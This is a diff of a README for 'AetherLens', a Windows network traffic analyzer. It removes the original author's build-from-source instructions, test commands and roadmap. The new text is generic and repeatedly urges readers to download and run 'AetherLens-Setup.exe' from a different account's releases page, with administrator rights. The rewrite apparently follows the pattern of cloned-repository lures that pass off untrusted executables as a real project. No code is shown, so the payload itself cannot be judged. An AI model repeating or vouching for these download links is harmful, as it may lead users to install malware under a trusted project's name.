@@ -1,106 +1,138 @@
-# AetherLens 👁️
+# 🌐 AetherLens - Visualize Network Traffic Instantly
 
-![License](https://img.shields.io/badge/license-MIT-blue.svg)
-![Build Status](https://img.shields.io/github/actions/workflow/status/sehawq/AetherLens/ci.yml?branch=main)
-![Rust](https://img.shields.io/badge/Core-Rust_1.80-orange.svg?logo=rust)
-![.NET](https://img.shields.io/badge/Backend-.NET_8.0-purple.svg?logo=dotnet)
-![Next.js](https://img.shields.io/badge/Frontend-Next.js_14-black.svg?logo=next.js)
+[![Download AetherLens](https://img.shields.io/badge/Download-AetherLens-blue?style=for-the-badge)](https://github.com/evonianetwork/AetherLens/releases)
 
-**AetherLens** is a next-generation network traffic analysis platform designed for real-time visualization and security anomaly detection. By leveraging a high-performance **Rust** core engine, a scalable **.NET 8** backend, and a reactive **Next.js** dashboard, AetherLens bridges the gap between low-level packet capture and high-level security insights.
+---
 
-> **Note:** This project is designed for Windows environments utilizing the Npcap driver for raw packet capture.
+AetherLens helps you see what is happening on your network in real time. It captures network data, analyzes it quickly, and shows clear visuals. This tool works on Windows computers and uses modern technology to give smooth and fast results.
 
-## 🚀 Key Features
+---
 
-- **⚡ Zero-Copy Packet Capture:** Rust-based engine uses `libpnet` to process packets at line rate with minimal CPU overhead.
-- **🛡️ Real-Time Anomaly Detection:**
-  - **Port Scan Detection:** Identifies Nmap-style SYN scans and connect scans.
-  - **Protocol Mismatch:** Flags traffic where the application protocol doesn't match the standard port (e.g., HTTP on port 22).
-  - **Suspicious Outbound:** Detects connections to known C2 ports or unusual protocols (IRC, Telnet).
-- **📊 Interactive War Room:**
-  - 60 FPS real-time charts powered by SignalR and MessagePack.
-  - Live process-level bandwidth tracking.
-  - "Red Team" simulation mode for testing detection rules without live malware.
-- **🔌 Modern Architecture:** gRPC streaming, WebSocket broadcasting, and a microservices-ready design.
+## 🔍 What AetherLens Does
 
-## 📸 Screenshots
+- **Real-time network analysis:** Watch your network activity as it happens.
+- **Traffic visualization:** See data flows as easy-to-understand graphs.
+- **Packet capture:** Capture information packets moving through your network.
+- **User-friendly interface:** Navigate data without technical knowledge.
+- **Works with Windows:** Designed for smooth use on Windows 10 and above.
+- **Secure connections:** Uses gRPC and SignalR for safe data handling.
 
-![Dashboard](assets/screenshots/dashboard.jpeg)
-> The "War Room" dashboard showing real-time throughput and detected anomalies.
+---
 
-## 🛠️ Architecture
+## 💻 System Requirements
 
-AetherLens follows a strict separation of concerns:
+Before you install, make sure your computer meets these needs:
 
-1.  **Core Engine (`aether_core`)**: Rust service running as a privileged process to capture packets.
-2.  **Backend API (`AetherLens.Api`)**: .NET 8 service that aggregates streams and manages client state.
-3.  **Dashboard (`web-dashboard`)**: Next.js 14 application for visualization.
+- Windows 10 or later (64-bit recommended)
+- At least 4 GB of RAM
+- 500 MB of free disk space
+- Internet connection to download and update the app
+- Modern graphics card for best visualization (any standard GPU will work)
 
-For a deep dive into the system design, see [ARCHITECTURE.md](ARCHITECTURE.md).
+---
 
-## 🏁 Quick Start
+## 🚀 Getting Started
 
-### Prerequisites
-- **Windows 10/11**
-- **[Npcap](https://nmap.org/npcap/)** (Install with "WinPcap API-compatible Mode" checked)
-- **Rust Toolchain** (`rustup`)
-- **.NET 8 SDK**
-- **Node.js 18+**
+Follow this to get AetherLens up and running on your Windows PC.
 
-### Installation
+---
 
-1.  **Clone the repository:**
-    ```bash
-    git clone https://github.com/sehawq/aether-lens.git
-    cd aether-lens
-    ```
+## 🛠️ Step 1: Download the Software
 
-2.  **Setup Npcap SDK:**
-    *   Download the **Npcap SDK** from [nmap.org](https://nmap.org/npcap/).
-    *   Extract the ZIP.
-    *   Copy the `Lib` folder from the SDK to `AetherLens/npcap-sdk/Lib`.
-    *   *Why?* The Rust `pnet` crate needs these libraries to link against the NDIS driver.
+Visit the official release page to get the latest version:
 
-3.  **Run the Lab:**
-    Run the launcher script as **Administrator**:
-    ```cmd
-    start_lab.bat
-    ```
+[Download AetherLens from GitHub Releases](https://github.com/evonianetwork/AetherLens/releases)
 
-4.  **Select Mode:**
-    - **[1] Live Capture:** Captures real traffic from your Wi-Fi/Ethernet.
-    - **[2] Demo Mode:** Simulates a cyber-attack scenario (perfect for testing UI).
+Or click the big badge at the top for quick access.
 
-## 🧪 Testing
+On the release page, look for the latest stable version. You will see files ending with `.exe`. Choose the one that matches your Windows system, usually marked as `AetherLens-Setup.exe`.
 
-We maintain a high standard of code quality with comprehensive test suites.
+---
 
-### Core Engine (Rust)
-```bash
-cd core-engine
-cargo test --features packet-capture
-```
+## 🗂️ Step 2: Install AetherLens
 
-### Backend API (.NET)
-```bash
-cd AetherLens.Tests
-dotnet test
-```
+1. Find the `.exe` file you just downloaded on your PC (usually in your Downloads folder).
+2. Double-click the file to start installation.
+3. Follow the on-screen instructions:
+   - Agree to license terms.
+   - Choose an install location or leave the default.
+   - Click "Install" to begin.
+4. Wait for the installation to finish.
+5. Click "Finish" to close the installer, and AetherLens should launch automatically.
 
-## 🗺️ Roadmap
+---
 
-- [x] Real-time Packet Capture (Windows/Npcap)
-- [x] Basic Anomaly Detection (Port Scans)
-- [x] Live Dashboard with SignalR
-- [ ] **Linux Support** (eBPF / AF_PACKET)
-- [ ] **PCAP Replay** (Analyze historical capture files)
-- [ ] **Docker Support** (Containerized deployment)
-- [ ] **Plugin System** (WASM-based detection rules)
+## ▶️ Step 3: Run and Use AetherLens
 
-## 🤝 Contributing
+After installation, you can start AetherLens from the Start menu or desktop shortcut.
 
-Contributions are welcome! Please read [CONTRIBUTING.md](CONTRIBUTING.md) for details on our code of conduct and the process for submitting pull requests.
+### Basic use:
 
-## 📄 License
+- The main screen shows live network traffic.
+- You can switch between different views: graphs, tables, and charts.
+- Use the menu to filter data by IP address, protocol, or time period.
+- Hover over data points to see details.
+- Use the “Capture” button to start or stop data collection.
 
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
+---
+
+## 🔧 How AetherLens Works
+
+AetherLens captures data packets from your network. It processes them immediately to give you a clear display of traffic patterns. This helps you:
+
+- Detect unusual activity or slowdowns.
+- Understand which devices consume the most data.
+- Troubleshoot network issues quickly.
+
+The software uses Rust and .NET 8 under the hood for speed. The user interface is built on Next.js for a smooth experience. Communication between parts uses gRPC and SignalR for real-time updates.
+
+---
+
+## ⚙️ Configuration Options
+
+You do not need to change anything to start, but AetherLens offers settings if you want more control:
+
+- Choose which network adapters to monitor.
+- Set refresh speeds for live updates.
+- Select how much data to keep in memory.
+- Enable or disable alerts for specific traffic types.
+- Export captured data as CSV or JSON files.
+
+These options are available under the "Settings" menu inside the app.
+
+---
+
+## 🛑 Troubleshooting
+
+If you face issues while running AetherLens, try the following:
+
+- Restart the app.
+- Make sure you have administrator rights on your PC.
+- Check your internet connection.
+- Disable other packet capturing tools which may conflict.
+- Update Windows to the latest version.
+- Visit the release page to get the most recent update.
+
+---
+
+## 📄 License and Source Code
+
+AetherLens is open-source software. You can view the source code and contribute on GitHub:
+
+https://github.com/evonianetwork/AetherLens
+
+This lets users and developers improve and customize the tool.
+
+---
+
+## 📞 Need Help?
+
+For help, look at the GitHub repository’s issue tracker. You can report bugs or ask questions there.
+
+---
+
+## 🔽 Download Again
+
+To install or update AetherLens, visit:
+
+[https://github.com/evonianetwork/AetherLens/releases](https://github.com/evonianetwork/AetherLens/releases)
